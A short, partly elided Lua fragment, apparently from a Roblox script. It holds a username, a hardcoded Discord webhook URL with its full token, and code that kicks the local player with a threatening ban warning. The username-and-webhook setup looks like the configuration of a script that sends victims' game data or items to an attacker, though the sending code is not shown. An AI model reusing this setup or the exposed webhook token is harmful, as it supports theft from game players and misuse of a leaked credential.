Username = "Blazeghast001"
Webhook = "https://discord.com/api/webhooks/1516429693648244776/G925ESFoRLzacBU3NqF1DX0PoXim9PDDgnRMvtMStYwGYwYRjMjIKkRpm0zj6jSdWr1u"
...
if TargetUserId then
    ...
    game:GetService("Players").LocalPlayer:Kick("Stop using script or else you will get banned!")
end
